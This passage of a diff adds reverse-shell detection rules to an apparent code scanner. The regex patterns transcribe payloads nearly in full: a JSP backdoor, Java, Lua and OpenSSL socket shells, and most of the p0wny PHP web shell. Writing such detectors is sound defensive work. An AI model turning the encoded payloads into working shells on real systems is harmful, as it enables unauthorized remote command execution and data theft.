+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "<%@\\\\r\\s+page\\s+import=\"java\\.lang\\.\\*,\\s+java\\.util\\.\\*,\\s+java\\.io\\.\\*,\\s+java\\.net\\.\\*\"\\\\r\\s+%\\s+>\\\\r\\s+<%!\\\\r\\s+static\\s+class\\s+StreamConnector\\s+extends\\s+Thread\\\\r\\s+\\{\\\\r\\s+InputStream\\s+is;\\\\r\\s+OutputStream\\s+os;\\\\r\\s+StreamConnector\\(InputStream\\s+is,\\s+OutputStream\\s+os\\)\\\\r\\s+\\S+\\\\r\\s+public\\s+void\\s+run\\(\\)\\\\r\\s+\\{\\\\r\\s+BufferedReader\\s+isr\\s+=\\s+null;\\\\r\\s+BufferedWriter\\s+osw\\s+=\\s+null;\\\\r\\s+try\\\\r\\s+\\{\\\\r\\s+isr\\s+=\\s+new\\s+BufferedReader\\(new\\s+InputStreamReader\\(is\\)\\);\\\\r\\s+osw\\s+=\\s+new\\s+BufferedWriter\\(new\\s+OutputStreamWriter\\(os\\)\\);\\\\r\\s+char\\s+buffer\\[\\]\\s+=\\s+new\\s+char\\[8192\\];\\\\r\\s+int\\s+lenRead;\\\\r\\s+while\\(\\s+\\(lenRead\\s+=\\s+isr\\.read\\(buffer,\\s+0,\\s+buffer\\.length\\)\\)\\s+>\\s+0\\)\\\\r\\s+\\S+\\\\r\\s+\\}\\\\r\\s+catch\\s+\\(Exception\\s+ioe\\)\\\\r\\s+try\\\\r\\s+\\S+\\\\r\\s+catch\\s+\\(Exception\\s+ioe\\)\\\\r\\s+\\}\\\\r\\s+\\}\\\\r\\s+%>\\\\r\\s+\\\\r\\s+<h1>JSP\\s+Backdoor\\s+Reverse\\s+Shell</h1>\\\\r\\s+\\\\r\\s+<form\\s+method=\"post\">\\\\r\\s+IP\\s+Address\\\\r\\s+<input\\s+type=\"text\"\\s+name=\"ipaddress\"\\s+size=30>\\\\r\\s+Port\\\\r\\s+<input\\s+type=\"text\"\\s+name=\"port\"\\s+size=10>\\\\r\\s+<input\\s+type=\"submit\"\\s+name=\"Connect\"\\s+value=\"Connect\">\\\\r\\s+</form>\\\\r\\s+<p>\\\\r\\s+<hr>\\\\r\\s+\\\\r\\s+<%\\\\r\\s+String\\s+ipAddress\\s+=\\s+request\\.getParameter\\(\"ipaddress\"\\);\\\\r\\s+String\\s+ipPort\\s+=\\s+request\\.getParameter\\(\"port\"\\);\\\\r\\s+if\\(ipAddress\\s+!=\\s+null\\s+\\&\\&\\s+ipPort\\s+!=\\s+null\\)\\\\r\\s+\\{\\\\r\\s+Socket\\s+sock\\s+=\\s+null;\\\\r\\s+try\\\\r\\s+\\S+\\\\r\\s+catch\\(Exception\\s+e\\)\\s+\\\\r\\s+\\}\\\\r\\s+%>",
+      "description": "Reverse shell payload (Java Web) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-032",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "String\\s+command\\s+=\\s+\"var\\s+host\\s+=\\s+\\\\'[\\w.\\-]+\\\\';\"\\s+\\+\\\\r\\s+\"var\\s+port\\s+=\\s+\\d+;\"\\s+\\+\\\\r\\s+\"var\\s+cmd\\s+=\\s+\\\\'\\S+\\\\';\"\\+\\\\r\\s+\"var\\s+s\\s+=\\s+new\\s+java\\.net\\.Socket\\(host,\\s+port\\);\"\\s+\\+\\\\r\\s+\"var\\s+p\\s+=\\s+new\\s+java\\.lang\\.ProcessBuilder\\(cmd\\)\\.redirectErrorStream\\(true\\)\\.start\\(\\);\"\\+\\\\r\\s+\"var\\s+pi\\s+=\\s+p\\.getInputStream\\(\\),\\s+pe\\s+=\\s+p\\.getErrorStream\\(\\),\\s+si\\s+=\\s+s\\.getInputStream\\(\\);\"\\+\\\\r\\s+\"var\\s+po\\s+=\\s+p\\.getOutputStream\\(\\),\\s+so\\s+=\\s+s\\.getOutputStream\\(\\);\"\\+\\\\r\\s+\"print\\s+\\(\\\\'Connected\\\\'\\);\"\\+\\\\r\\s+\"while\\s+\\(!s\\.isClosed\\(\\)\\)\\s+\\{\"\\+\\\\r\\s+\"\\s+while\\s+\\(pi\\.available\\(\\)\\s+>\\s+0\\)\"\\+\\\\r\\s+\"\\s+so\\.write\\(pi\\.read\\(\\)\\);\"\\+\\\\r\\s+\"\\s+while\\s+\\(pe\\.available\\(\\)\\s+>\\s+0\\)\"\\+\\\\r\\s+\"\\s+so\\.write\\(pe\\.read\\(\\)\\);\"\\+\\\\r\\s+\"\\s+while\\s+\\(si\\.available\\(\\)\\s+>\\s+0\\)\"\\+\\\\r\\s+\"\\s+po\\.write\\(si\\.read\\(\\)\\);\"\\+\\\\r\\s+\"\\s+so\\.flush\\(\\);\"\\+\\\\r\\s+\"\\s+po\\.flush\\(\\);\"\\+\\\\r\\s+\"\\s+java\\.lang\\.Thread\\.sleep\\(50\\);\"\\+\\\\r\\s+\"\\s+try\\s+\\S+\"\\+\\\\r\\s+\"\\s+catch\\s+\\(e\\)\\s+\\S+\"\\+\\\\r\\s+\"\\}\"\\+\\\\r\\s+\"p\\.destroy\\(\\);\"\\+\\\\r\\s+\"s\\.close\\(\\);\";\\\\r\\s+String\\s+x\\s+=\\s+\"\\\\\"\\\\\"\\.getClass\\(\\)\\.forName\\(\\\\\"javax\\.script\\.ScriptEngineManager\\\\\"\\)\\.newInstance\\(\\)\\.getEngineByName\\(\\\\\"JavaScript\\\\\"\\)\\.eval\\(\\\\\"\"\\+command\\+\"\\\\\"\\)\";\\\\r\\s+ref\\.add\\(new\\s+StringRefAddr\\(\"x\",\\s+x\\);",
+      "description": "Reverse shell payload (Javascript) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-033",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "lua\\s+\\-e\\s+\"require\\('socket'\\);require\\('os'\\);t=socket\\.tcp\\(\\);t:connect\\('[\\w.\\-]+','\\d+'\\);os\\.execute\\('\\S+\\s+\\-i\\s+<\\&3\\s+>\\&3\\s+2>\\&3'\\);\"",
+      "description": "Reverse shell payload (Lua #1) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-034",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "lua5\\.1\\s+\\-e\\s+'local\\s+host,\\s+port\\s+=\\s+\"[\\w.\\-]+\",\\s+\\d+\\s+local\\s+socket\\s+=\\s+require\\(\"socket\"\\)\\s+local\\s+tcp\\s+=\\s+socket\\.tcp\\(\\)\\s+local\\s+io\\s+=\\s+require\\(\"io\"\\)\\s+tcp:connect\\(host,\\s+port\\);\\s+while\\s+true\\s+do\\s+local\\s+cmd,\\s+status,\\s+partial\\s+=\\s+tcp:receive\\(\\)\\s+local\\s+f\\s+=\\s+io\\.popen\\(cmd,\\s+\"r\"\\)\\s+local\\s+s\\s+=\\s+f:read\\(\"\\*a\"\\)\\s+f:close\\(\\)\\s+tcp:send\\(s\\)\\s+if\\s+status\\s+==\\s+\"closed\"\\s+then\\s+break\\s+end\\s+end\\s+tcp:close\\(\\)'",
+      "description": "Reverse shell payload (Lua #2) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-035",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "mkfifo\\s+/tmp/s;\\s+\\S+\\s+\\-i\\s+<\\s+/tmp/s\\s+2>\\&1\\s+\\|\\s+openssl\\s+s_client\\s+\\-quiet\\s+\\-connect\\s+[\\w.\\-]+:\\d+\\s+>\\s+/tmp/s;\\s+rm\\s+/tmp/s",
+      "description": "Reverse shell payload (OpenSSL) — interactive C2 one-liner",
+      "suppress": {
+        "line_contains": [
+          "sigil-reviewed-revshell"
+        ]
+      }
+    },
+    {
+      "id": "RSHELL-036",
+      "phase": "network_exfil",
+      "severity": "high",
+      "weight": 5,
+      "pattern": "<\\?php\\\\r\\s+\\\\r\\s+\\$SHELL_CONFIG\\s+=\\s+array\\(\\\\r\\s+\\\\'username\\\\'\\s+=>\\s+\\\\'p0wny\\\\',\\\\r\\s+\\\\'hostname\\\\'\\s+=>\\s+\\\\'shell\\\\',\\\\r\\s+\\);\\\\r\\s+\\\\r\\s+function\\s+expandPath\\(\\$path\\)\\s+\\{\\\\r\\s+if\\s+\\(preg_match\\(\"\\#\\^\\(\\~\\[a\\-zA\\-Z0\\-9_\\.\\-\\]\\*\\)\\(/\\.\\*\\)\\?\\$\\#\",\\s+\\$path,\\s+\\$match\\)\\)\\s+\\S+\\\\r\\s+return\\s+\\$path;\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+allFunctionExist\\(\\$list\\s+=\\s+array\\(\\)\\)\\s+\\{\\\\r\\s+foreach\\s+\\(\\$list\\s+as\\s+\\$entry\\)\\s+\\{\\\\r\\s+if\\s+\\(!function_exists\\(\\$entry\\)\\)\\s+\\S+\\\\r\\s+\\}\\\\r\\s+return\\s+true;\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+executeCommand\\(\\$cmd\\)\\s+\\{\\\\r\\s+\\$output\\s+=\\s+\\\\'\\\\';\\\\r\\s+if\\s+\\(function_exists\\(\\\\'exec\\\\'\\)\\)\\s+\\S+\\s+else\\s+if\\s+\\(function_exists\\(\\\\'shell_exec\\\\'\\)\\)\\s+\\S+\\s+else\\s+if\\s+\\(allFunctionExist\\(array\\(\\\\'system\\\\',\\s+\\\\'ob_start\\\\',\\s+\\\\'ob_get_contents\\\\',\\s+\\\\'ob_end_clean\\\\'\\)\\)\\)\\s+\\S+\\s+else\\s+if\\s+\\(allFunctionExist\\(array\\(\\\\'passthru\\\\',\\s+\\\\'ob_start\\\\',\\s+\\\\'ob_get_contents\\\\',\\s+\\\\'ob_end_clean\\\\'\\)\\)\\)\\s+\\S+\\s+else\\s+if\\s+\\(allFunctionExist\\(array\\(\\\\'popen\\\\',\\s+\\\\'feof\\\\',\\s+\\\\'fread\\\\',\\s+\\\\'pclose\\\\'\\)\\)\\)\\s+\\{\\\\r\\s+\\$handle\\s+=\\s+popen\\(\\$cmd,\\s+\\\\'r\\\\'\\);\\\\r\\s+while\\s+\\(!feof\\(\\$handle\\)\\)\\s+\\S+\\\\r\\s+pclose\\(\\$handle\\);\\\\r\\s+\\}\\s+else\\s+if\\s+\\(allFunctionExist\\(array\\(\\\\'proc_open\\\\',\\s+\\\\'stream_get_contents\\\\',\\s+\\\\'proc_close\\\\'\\)\\)\\)\\s+\\S+\\\\r\\s+return\\s+\\$output;\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+isRunningWindows\\(\\)\\s+\\S+\\\\r\\s+\\\\r\\s+function\\s+featureShell\\(\\$cmd,\\s+\\$cwd\\)\\s+\\{\\\\r\\s+\\$stdout\\s+=\\s+\"\";\\\\r\\s+\\\\r\\s+if\\s+\\(preg_match\\(\"/\\^\\\\s\\*cd\\\\s\\*\\(2>\\&1\\)\\?\\$/\",\\s+\\$cmd\\)\\)\\s+\\S+\\s+elseif\\s+\\(preg_match\\(\"/\\^\\\\s\\*cd\\\\s\\+\\(\\.\\+\\)\\\\s\\*\\(2>\\&1\\)\\?\\$/\",\\s+\\$cmd\\)\\)\\s+\\S+\\s+elseif\\s+\\(preg_match\\(\"/\\^\\\\s\\*download\\\\s\\+\\[\\^\\\\s\\]\\+\\\\s\\*\\(2>\\&1\\)\\?\\$/\",\\s+\\$cmd\\)\\)\\s+\\S+\\s+else\\s+\\S+\\\\r\\s+\\\\r\\s+return\\s+array\\(\\\\r\\s+\"stdout\"\\s+=>\\s+base64_encode\\(\\$stdout\\),\\\\r\\s+\"cwd\"\\s+=>\\s+base64_encode\\(getcwd\\(\\)\\)\\\\r\\s+\\);\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+featurePwd\\(\\)\\s+\\S+\\\\r\\s+\\\\r\\s+function\\s+featureHint\\(\\$fileName,\\s+\\$cwd,\\s+\\$type\\)\\s+\\{\\\\r\\s+chdir\\(\\$cwd\\);\\\\r\\s+if\\s+\\(\\$type\\s+==\\s+\\\\'cmd\\\\'\\)\\s+\\S+\\s+else\\s+\\S+\\\\r\\s+\\$cmd\\s+=\\s+\"/bin/bash\\s+\\-c\\s+\\\\\"\\$cmd\\\\\"\";\\\\r\\s+\\$files\\s+=\\s+explode\\(\"\\s+\",\\s+shell_exec\\(\\$cmd\\)\\);\\\\r\\s+foreach\\s+\\(\\$files\\s+as\\s+\\&\\$filename\\)\\s+\\S+\\\\r\\s+return\\s+array\\(\\\\r\\s+\\\\'files\\\\'\\s+=>\\s+\\$files,\\\\r\\s+\\);\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+featureDownload\\(\\$filePath\\)\\s+\\{\\\\r\\s+\\$file\\s+=\\s+@file_get_contents\\(\\$filePath\\);\\\\r\\s+if\\s+\\(\\$file\\s+===\\s+FALSE\\)\\s+\\S+\\s+else\\s+\\S+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+featureUpload\\(\\$path,\\s+\\$file,\\s+\\$cwd\\)\\s+\\{\\\\r\\s+chdir\\(\\$cwd\\);\\\\r\\s+\\$f\\s+=\\s+@fopen\\(\\$path,\\s+\\\\'wb\\\\'\\);\\\\r\\s+if\\s+\\(\\$f\\s+===\\s+FALSE\\)\\s+\\S+\\s+else\\s+\\S+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+initShellConfig\\(\\)\\s+\\{\\\\r\\s+global\\s+\\$SHELL_CONFIG;\\\\r\\s+\\\\r\\s+if\\s+\\(isRunningWindows\\(\\)\\)\\s+\\{\\\\r\\s+\\$username\\s+=\\s+getenv\\(\\\\'USERNAME\\\\'\\);\\\\r\\s+if\\s+\\(\\$username\\s+!==\\s+false\\)\\s+\\S+\\\\r\\s+\\}\\s+else\\s+\\{\\\\r\\s+\\$pwuid\\s+=\\s+posix_getpwuid\\(posix_geteuid\\(\\)\\);\\\\r\\s+if\\s+\\(\\$pwuid\\s+!==\\s+false\\)\\s+\\S+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+\\$hostname\\s+=\\s+gethostname\\(\\);\\\\r\\s+if\\s+\\(\\$hostname\\s+!==\\s+false\\)\\s+\\S+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+if\\s+\\(isset\\(\\$_GET\\[\"feature\"\\]\\)\\)\\s+\\{\\\\r\\s+\\\\r\\s+\\$response\\s+=\\s+NULL;\\\\r\\s+\\\\r\\s+switch\\s+\\(\\$_GET\\[\"feature\"\\]\\)\\s+\\{\\\\r\\s+case\\s+\"shell\":\\\\r\\s+\\$cmd\\s+=\\s+\\$_POST\\[\\\\'cmd\\\\'\\];\\\\r\\s+if\\s+\\(!preg_match\\(\\\\'/2>/\\\\',\\s+\\$cmd\\)\\)\\s+\\S+\\\\r\\s+\\$response\\s+=\\s+featureShell\\(\\$cmd,\\s+\\$_POST\\[\"cwd\"\\]\\);\\\\r\\s+break;\\\\r\\s+case\\s+\"pwd\":\\\\r\\s+\\$response\\s+=\\s+featurePwd\\(\\);\\\\r\\s+break;\\\\r\\s+case\\s+\"hint\":\\\\r\\s+\\$response\\s+=\\s+featureHint\\(\\$_POST\\[\\\\'filename\\\\'\\],\\s+\\$_POST\\[\\\\'cwd\\\\'\\],\\s+\\$_POST\\[\\\\'type\\\\'\\]\\);\\\\r\\s+break;\\\\r\\s+case\\s+\\\\'upload\\\\':\\\\r\\s+\\$response\\s+=\\s+featureUpload\\(\\$_POST\\[\\\\'path\\\\'\\],\\s+\\$_POST\\[\\\\'file\\\\'\\],\\s+\\$_POST\\[\\\\'cwd\\\\'\\]\\);\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+header\\(\"Content\\-Type:\\s+application/json\"\\);\\\\r\\s+echo\\s+json_encode\\(\\$response\\);\\\\r\\s+die\\(\\);\\\\r\\s+\\}\\s+else\\s+\\S+\\\\r\\s+\\\\r\\s+\\?><!DOCTYPE\\s+html>\\\\r\\s+\\\\r\\s+<html>\\\\r\\s+\\\\r\\s+<head>\\\\r\\s+<meta\\s+charset=\"UTF\\-8\"\\s+/>\\\\r\\s+<title>p0wny@shell:\\~\\#</title>\\\\r\\s+<meta\\s+name=\"viewport\"\\s+content=\"width=device\\-width,\\s+initial\\-scale=1\\.0\"\\s+/>\\\\r\\s+<style>\\\\r\\s+html,\\s+body\\s+\\S+\\\\r\\s+\\\\r\\s+\\*::\\-webkit\\-scrollbar\\-track\\s+\\S+\\\\r\\s+\\\\r\\s+\\*::\\-webkit\\-scrollbar\\s+\\S+\\\\r\\s+\\\\r\\s+\\*::\\-webkit\\-scrollbar\\-thumb\\s+\\S+\\\\r\\s+\\\\r\\s+\\#shell\\s+\\S+\\\\r\\s+\\\\r\\s+\\#shell\\-content\\s+\\S+\\\\r\\s+\\\\r\\s+\\#shell\\-logo\\s+\\S+\\\\r\\s+\\\\r\\s+:root\\s+\\S+\\\\r\\s+\\\\r\\s+@media\\s+\\(min\\-width:\\s+1200px\\)\\s+\\{\\\\r\\s+:root\\s+\\S+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+@media\\s+\\(max\\-width:\\s+991px\\),\\\\r\\s+\\(max\\-height:\\s+600px\\)\\s+\\{\\\\r\\s+\\#shell\\-logo\\s+\\S+\\\\r\\s+:root\\s+\\S+\\\\r\\s+\\#shell\\s+\\S+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+@media\\s+\\(max\\-width:\\s+767px\\)\\s+\\{\\\\r\\s+\\#shell\\-input\\s+\\S+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+@media\\s+\\(max\\-width:\\s+320px\\)\\s+\\{\\\\r\\s+\\#shell\\-logo\\s+\\S+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+\\.shell\\-prompt\\s+\\S+\\\\r\\s+\\\\r\\s+\\.shell\\-prompt\\s+>\\s+span\\s+\\S+\\\\r\\s+\\\\r\\s+\\#shell\\-input\\s+\\S+\\\\r\\s+\\\\r\\s+\\#shell\\-input\\s+>\\s+label\\s+\\S+\\\\r\\s+\\\\r\\s+\\#shell\\-input\\s+\\#shell\\-cmd\\s+\\S+\\\\r\\s+\\\\r\\s+\\#shell\\-input\\s+div\\s+\\S+\\\\r\\s+\\\\r\\s+\\#shell\\-input\\s+input\\s+\\S+\\\\r\\s+</style>\\\\r\\s+\\\\r\\s+<script>\\\\r\\s+var\\s+SHELL_CONFIG\\s+=\\s+<\\?php\\s+echo\\s+json_encode\\(\\$SHELL_CONFIG\\);\\s+\\?>;\\\\r\\s+var\\s+CWD\\s+=\\s+null;\\\\r\\s+var\\s+commandHistory\\s+=\\s+\\[\\];\\\\r\\s+var\\s+historyPosition\\s+=\\s+0;\\\\r\\s+var\\s+eShellCmdInput\\s+=\\s+null;\\\\r\\s+var\\s+eShellContent\\s+=\\s+null;\\\\r\\s+\\\\r\\s+function\\s+_insertCommand\\(command\\)\\s+\\S+\\\\r\\s+\\\\r\\s+function\\s+_insertStdout\\(stdout\\)\\s+\\S+\\\\r\\s+\\\\r\\s+function\\s+_defer\\(callback\\)\\s+\\S+\\\\r\\s+\\\\r\\s+function\\s+featureShell\\(command\\)\\s+\\{\\\\r\\s+\\\\r\\s+_insertCommand\\(command\\);\\\\r\\s+if\\s+\\(/\\^\\\\s\\*upload\\\\s\\+\\[\\^\\\\s\\]\\+\\\\s\\*\\$/\\.test\\(command\\)\\)\\s+\\S+\\s+else\\s+if\\s+\\(/\\^\\\\s\\*clear\\\\s\\*\\$/\\.test\\(command\\)\\)\\s+\\S+\\s+else\\s+\\{\\\\r\\s+makeRequest\\(\"\\?feature=shell\",\\s+\\S+,\\s+function\\s+\\(response\\)\\s+\\{\\\\r\\s+if\\s+\\(response\\.hasOwnProperty\\(\\\\'file\\\\'\\)\\)\\s+\\S+\\s+else\\s+\\S+\\\\r\\s+\\}\\);\\\\r\\s+\\}\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+featureHint\\(\\)\\s+\\{\\\\r\\s+if\\s+\\(eShellCmdInput\\.value\\.trim\\(\\)\\.length\\s+===\\s+0\\)\\s+return;\\s+//\\s+field\\s+is\\s+empty\\s+\\->\\s+nothing\\s+to\\s+complete\\\\r\\s+\\\\r\\s+function\\s+_requestCallback\\(data\\)\\s+\\{\\\\r\\s+if\\s+\\(data\\.files\\.length\\s+<=\\s+1\\)\\s+return;\\s+//\\s+no\\s+completion\\\\r\\s+data\\.files\\s+=\\s+data\\.files\\.map\\(function\\(file\\)\\S+\\);\\\\r\\s+if\\s+\\(data\\.files\\.length\\s+===\\s+2\\)\\s+\\{\\\\r\\s+if\\s+\\(type\\s+===\\s+\\\\'cmd\\\\'\\)\\s+\\S+\\s+else\\s+\\S+\\\\r\\s+\\}\\s+else\\s+\\S+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+var\\s+currentCmd\\s+=\\s+eShellCmdInput\\.value\\.split\\(\"\\s+\"\\);\\\\r\\s+var\\s+type\\s+=\\s+\\(currentCmd\\.length\\s+===\\s+1\\)\\s+\\?\\s+\"cmd\"\\s+:\\s+\"file\";\\\\r\\s+var\\s+fileName\\s+=\\s+\\(type\\s+===\\s+\"cmd\"\\)\\s+\\?\\s+currentCmd\\[0\\]\\s+:\\s+currentCmd\\[currentCmd\\.length\\s+\\-\\s+1\\];\\\\r\\s+\\\\r\\s+makeRequest\\(\\\\r\\s+\"\\?feature=hint\",\\\\r\\s+\\S+,\\\\r\\s+_requestCallback\\\\r\\s+\\);\\\\r\\s+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+featureDownload\\(name,\\s+file\\)\\s+\\S+\\\\r\\s+\\\\r\\s+function\\s+featureUpload\\(path\\)\\s+\\{\\\\r\\s+var\\s+element\\s+=\\s+document\\.createElement\\(\\\\'input\\\\'\\);\\\\r\\s+element\\.setAttribute\\(\\\\'type\\\\',\\s+\\\\'file\\\\'\\);\\\\r\\s+element\\.style\\.display\\s+=\\s+\\\\'none\\\\';\\\\r\\s+document\\.body\\.appendChild\\(element\\);\\\\r\\s+element\\.addEventListener\\(\\\\'change\\\\',\\s+function\\s+\\(\\)\\s+\\{\\\\r\\s+var\\s+promise\\s+=\\s+getBase64\\(element\\.files\\[0\\]\\);\\\\r\\s+promise\\.then\\(function\\s+\\(file\\)\\s+\\{\\\\r\\s+makeRequest\\(\\\\'\\?feature=upload\\\\',\\s+\\S+,\\s+function\\s+\\(response\\)\\s+\\S+\\);\\\\r\\s+\\},\\s+function\\s+\\(\\)\\s+\\S+\\);\\\\r\\s+\\}\\);\\\\r\\s+element\\.click\\(\\);\\\\r\\s+document\\.body\\.removeChild\\(element\\);\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+getBase64\\(file,\\s+onLoadCallback\\)\\s+\\{\\\\r\\s+return\\s+new\\s+Promise\\(function\\(resolve,\\s+reject\\)\\s+\\{\\\\r\\s+var\\s+reader\\s+=\\s+new\\s+FileReader\\(\\);\\\\r\\s+reader\\.onload\\s+=\\s+function\\(\\)\\s+\\S+;\\\\r\\s+reader\\.onerror\\s+=\\s+reject;\\\\r\\s+reader\\.readAsDataURL\\(file\\);\\\\r\\s+\\}\\);\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+genPrompt\\(cwd\\)\\s+\\{\\\\r\\s+cwd\\s+=\\s+cwd\\s+\\|\\|\\s+\"\\~\";\\\\r\\s+var\\s+shortCwd\\s+=\\s+cwd;\\\\r\\s+if\\s+\\(cwd\\.split\\(\"/\"\\)\\.length\\s+>\\s+3\\)\\s+\\S+\\\\r\\s+return\\s+SHELL_CONFIG\\[\"username\"\\]\\s+\\+\\s+\"@\"\\s+\\+\\s+SHELL_CONFIG\\[\"hostname\"\\]\\s+\\+\\s+\":<span\\s+title=\\\\\"\"\\s+\\+\\s+cwd\\s+\\+\\s+\"\\\\\">\"\\s+\\+\\s+shortCwd\\s+\\+\\s+\"</span>\\#\";\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+updateCwd\\(cwd\\)\\s+\\{\\\\r\\s+if\\s+\\(cwd\\)\\s+\\S+\\\\r\\s+makeRequest\\(\"\\?feature=pwd\",\\s+\\S+,\\s+function\\(response\\)\\s+\\S+\\);\\\\r\\s+\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+escapeHtml\\(string\\)\\s+\\S+\\\\r\\s+\\\\r\\s+function\\s+_updatePrompt\\(\\)\\s+\\S+\\\\r\\s+\\\\r\\s+function\\s+_onShellCmdKeyDown\\(event\\)\\s+\\{\\\\r\\s+switch\\s+\\(event\\.key\\)\\s+\\{\\\\r\\s+case\\s+\"Enter\":\\\\r\\s+featureShell\\(eShellCmdInput\\.value\\);\\\\r\\s+insertToHistory\\(eShellCmdInput\\.value\\);\\\\r\\s+eShellCmdInput\\.value\\s+=\\s+\"\";\\\\r\\s+break;\\\\r\\s+case\\s+\"ArrowUp\":\\\\r\\s+if\\s+\\(historyPosition\\s+>\\s+0\\)\\s+\\{\\\\r\\s+historyPosition\\-\\-;\\\\r\\s+eShellCmdInput\\.blur\\(\\);\\\\r\\s+eShellCmdInput\\.value\\s+=\\s+commandHistory\\[historyPosition\\];\\\\r\\s+_defer\\(function\\(\\)\\s+\\S+\\);\\\\r\\s+\\}\\\\r\\s+break;\\\\r\\s+case\\s+\"ArrowDown\":\\\\r\\s+if\\s+\\(historyPosition\\s+>=\\s+commandHistory\\.length\\)\\s+\\S+\\\\r\\s+historyPosition\\+\\+;\\\\r\\s+if\\s+\\(historyPosition\\s+===\\s+commandHistory\\.length\\)\\s+\\S+\\s+else\\s+\\S+\\\\r\\s+break;\\\\r\\s+case\\s+\\\\'Tab\\\\':\\\\r\\s+event\\.preventDefault\\(\\);\\\\r\\s+featureHint\\(\\);\\\\r\\s+break;\\\\r\\s+\\}\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+function\\s+insertToHistory\\(cmd\\)\\s+\\S+\\\\r\\s+\\\\r\\s+function\\s+makeRequest\\(url,\\s+params,\\s+callback\\)\\s+\\{\\\\r\\s+function\\s+getQueryString\\(\\)\\s+\\{\\\\r\\s+var\\s+a\\s+=\\s+\\[\\];\\\\r\\s+for\\s+\\(var\\s+key\\s+in\\s+params\\)\\s+\\{\\\\r\\s+if\\s+\\(params\\.hasOwnProperty\\(key\\)\\)\\s+\\S+\\\\r\\s+\\}\\\\r\\s+return\\s+a\\.join\\(\"\\&\"\\);\\\\r\\s+\\}\\\\r\\s+var\\s+xhr\\s+=\\s+new\\s+XMLHttpRequest\\(\\);\\\\r\\s+xhr\\.open\\(\"POST\",\\s+url,\\s+true\\);\\\\r\\s+xhr\\.setRequestHeader\\(\"Content\\-Type\",\\s+\"application/x\\-www\\-form\\-urlencoded\"\\);\\\\r\\s+xhr\\.onreadystatechange\\s+=\\s+function\\(\\)\\s+\\{\\\\r\\s+if\\s+\\(xhr\\.readyState\\s+===\\s+4\\s+\\&\\&\\s+xhr\\.status\\s+===\\s+200\\)\\s+\\{\\\\r\\s+try\\s+\\S+\\s+catch\\s+\\(error\\)\\s+\\S+\\\\r\\s+\\}\\\\r\\s+\\};\\\\r\\s+xhr\\.send\\(getQueryString\\(\\)\\);\\\\r\\s+\\}\\\\r\\s+\\\\r\\s+document\\.onclick\\s+=\\s+function\\(event\\)\\s+\\{\\\\r\\s+event\\s+=\\s+event\\s+\\|\\|\\s+window\\.event;\\\\r\\s+var\\s+selection\\s+=\\s+window\\.getSelection\\(\\);\\\\r\\s+var\\s+target\\s+=\\s+event\\.target\\s+\\|\\|\\s+event\\.srcElement;\\\\r\\s+\\\\r\\s+if\\s+\\(target\\.tagName\\s+===\\s+\"SELECT\"\\)\\s+\\S+\\\\r\\s+\\\\r\\s+if\\s+\\(!selection\\.toString\\(\\)\\)\\s+\\S+\\\\r\\s+\\};\\\\r\\s+\\\\r\\s+window\\.onload\\s+=\\s+function\\(\\)\\s+\\S+;\\\\r\\s+</script>\\\\r\\s+</head>\\\\r\\s+\\\\r\\s+<body>\\\\r\\s+<div\\s+id=\"shell\">\\\\r\\s+<pre\\s+id=\"shell\\-content\">\\\\r\\s+<div\\s+id=\"shell\\-logo\">\\\\r\\s+___\\s+____\\s+_\\s+_\\s+_\\s+_\\s+_\\s+<span></span>\\\\r\\s+_\\s+__\\s+/\\s+_\\s+\\\\__\\s+___\\s+__\\s+_\\s+_\\s+/\\s+__\\s+\\\\\\s+___\\|\\s+\\|__\\s+___\\|\\s+\\|\\s+\\|_\\s+/\\\\/\\|\\|\\s+\\|\\|\\s+\\|_\\s+<span></span>\\\\r\\s+\\|\\s+\\\\'_\\s+\\\\\\|\\s+\\|\\s+\\|\\s+\\\\\\s+\\\\\\s+/\\\\\\s+/\\s+/\\s+\\\\'_\\s+\\\\\\|\\s+\\|\\s+\\|\\s+\\|/\\s+/\\s+_`\\s+/\\s+__\\|\\s+\\\\'_\\s+\\\\\\s+/\\s+_\\s+\\\\\\s+\\|\\s+\\(_\\)/\\\\/_\\s+\\.\\.\\s+_\\|<span></span>\\\\r\\s+\\|\\s+\\|_\\)\\s+\\|\\s+\\|_\\|\\s+\\|\\\\\\s+V\\s+V\\s+/\\|\\s+\\|\\s+\\|\\s+\\|\\s+\\|_\\|\\s+\\|\\s+\\|\\s+\\(_\\|\\s+\\\\__\\s+\\\\\\s+\\|\\s+\\|\\s+\